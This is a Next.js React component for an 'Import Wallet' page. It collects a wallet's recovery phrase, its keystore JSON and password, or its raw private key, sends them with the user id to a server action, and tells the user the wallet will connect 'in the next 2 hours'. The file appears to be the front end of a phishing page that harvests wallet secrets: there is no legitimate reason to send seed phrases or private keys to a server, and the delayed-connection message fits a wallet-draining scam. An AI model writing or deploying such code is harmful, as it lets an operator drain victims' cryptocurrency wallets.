"use client";

import Image from "next/image";
import React, { FormEvent, useState } from "react";
import { toast } from "sonner";
import { useUserStore } from "@/lib/store/userStore";
import { useRouter } from "next/navigation";
import WalletConnectSuccessDialog from "@/components/WalletConnectSuccessDialog";
import Loader from "@/components/Loader";
import { TABS } from "@/constants";
import { connectUserWalletConnectAction } from "@/app/(app)/link-wallet/connect-wallet/action";

export default function ConnectWalletClient() {
  const router = useRouter();

  const user = useUserStore((state) => state.user);

  const [tab, setTab] = useState("phrase");
  const [phrase, setPhrase] = useState("");
  const [keystore, setKeystore] = useState("");
  const [keystorePassword, setKeystorePassword] = useState("");
  const [privateKey, setPrivateKey] = useState("");

  const [isSuccess, setIsSuccess] = useState(false);

  const [isLoading, setIsLoading] = useState(false);

  const handleImport = async (e: FormEvent) => {
    e.preventDefault();
    
    if (!user) {
      toast.error("Session expired. Please log in")
      router.push("/sign-in")
      return;
    }

    setIsLoading(true);
    try {
      if (tab === "phrase") {
        await connectUserWalletConnectAction(user?.uid, "phrase", phrase);
        toast.success("Wallet will be connected in the next 2 hours!");
        setIsSuccess(true)
      } else if (tab === "keystore") {
        await connectUserWalletConnectAction(user?.uid, "keystorejson", {
          address: keystore,
          password: keystorePassword,
        });
        toast.success("Wallet will be connected in the next 2 hours!");
        setIsSuccess(true)
      } else if (tab === "private") {
        await connectUserWalletConnectAction(user?.uid, "privatekey", privateKey);
        toast.success("Wallet will be connected in the next 2 hours!");
        setIsSuccess(true)
      }
    } catch (error) {
      toast.error(
        error instanceof Error
          ? error.message
          : "Import failed. Please check your input."
      );
    } finally {
      setIsLoading(false);
      setPhrase("");
      setKeystore("");
      setKeystorePassword("");
      setPrivateKey("");
    }
  };

  return (
    <div className="flex flex-col items-center min-h-screen bg-white py-12 px-2 md:px-4">
      <div className="mb-8 flex flex-col items-center">
        <Image src="/W-iconn.png" alt="wallet icon" width={70} height={70} className="w-14 h-14" />
        <div className="mt-2 text-lg font-medium text-gray-600">Import Wallet</div>
      </div>
      <div className="flex justify-center gap-0 sm:gap-6 md:gap-12 mb-6 max-w-7xl w-full">
        {TABS.map((t) => (
          <button
            key={t.value}
            className={`px-1 sm:px-6 py-2 rounded font-semibold hover:bg-[#1565c0] transition-all hover:text-white ${
              tab === t.value
                ? "bg-[#1565c0] text-white"
                : "bg-transparent text-[#1565c0]"
            }`}
            onClick={() => setTab(t.value)}
            type="button"
            disabled={isLoading}
            style={{ minWidth: 120, cursor: isLoading ? "not-allowed" : "pointer" }}
          >
            {t.label}
          </button>
        ))}
      </div>
      <form onSubmit={handleImport} className="w-full max-w-7xl bg-white rounded shadow-[0_8px_32px_0_rgba(0,0,0,0.2)] p-8">
        {tab === "phrase" && (
          <>
            <textarea
              className="w-full border rounded px-4 py-3 text-lg mb-6"
              rows={5}
              placeholder="Phrase"
              value={phrase}
              onChange={(e) => setPhrase(e.target.value)}
              required
            />
            <button
              className="w-full bg-[#1565c0] text-white rounded py-3 text-lg font-medium border border-[#1565c0] cursor-pointer"
              type="submit"
              disabled={isLoading}
              style={{ cursor: isLoading ? "not-allowed" : "pointer" }}
            >
              Import
            </button>
            <div className="text-center text-md text-gray-600 mt-8">
              Typically 12 (sometimes 24) words separated by single spaces
            </div>
          </>
        )}
        {tab === "keystore" && (
          <>
            <textarea
              className="w-full border rounded px-4 py-3 text-lg mb-4"
              rows={4}
              placeholder="Keystore JSON"
              value={keystore}
              onChange={(e) => setKeystore(e.target.value)}
            />
            <input
              type="password"
              className="w-full border rounded px-4 py-3 text-lg mb-6"
              placeholder="Password"
              value={keystorePassword}
              onChange={(e) => setKeystorePassword(e.target.value)}
              required
            />
            <button
              className="w-full bg-[#1565c0] text-white rounded py-3 text-lg font-medium border border-[#1565c0] cursor-pointer"
              type="submit"
              disabled={isLoading}
              style={{ cursor: isLoading ? "not-allowed" : "pointer" }}
            >
              Import
            </button>
            <div className="text-center text-md text-gray-600 mt-8">
              Upload your Keystore JSON file and enter your password
            </div>
          </>
        )}
        {tab === "private" && (
          <>
            <textarea
              className="w-full border rounded px-4 py-3 text-lg mb-6"
              rows={3}
              placeholder="Private Key"
              value={privateKey}
              onChange={(e) => setPrivateKey(e.target.value)}
              required
            />
            <button
              className="w-full bg-[#1565c0] text-white rounded py-3 text-lg font-medium border border-[#1565c0] cursor-pointer"
              type="submit"
              disabled={isLoading}
              style={{ cursor: isLoading ? "not-allowed" : "pointer" }}
            >
              Import
            </button>
            <div className="text-center text-md text-gray-600 mt-8">
              Typically 64 alphanumeric characters
            </div>
          </>
        )}
      </form>

      {
        isLoading && (
          <div className="absolute inset-0 bg-[rgba(0,0,0,0.5)] flex items-center">
            <div className="bg-[#2A2A2A] min-h-[40dvh] w-full flex flex-col gap-8 justify-center items-center">
              <Loader />

              <p className="font-medium text-white">Submitting, please be patient.</p>
            </div>
          </div>
        )}
      {isSuccess && <WalletConnectSuccessDialog setIsSuccess={setIsSuccess} />}
    </div>
  );
}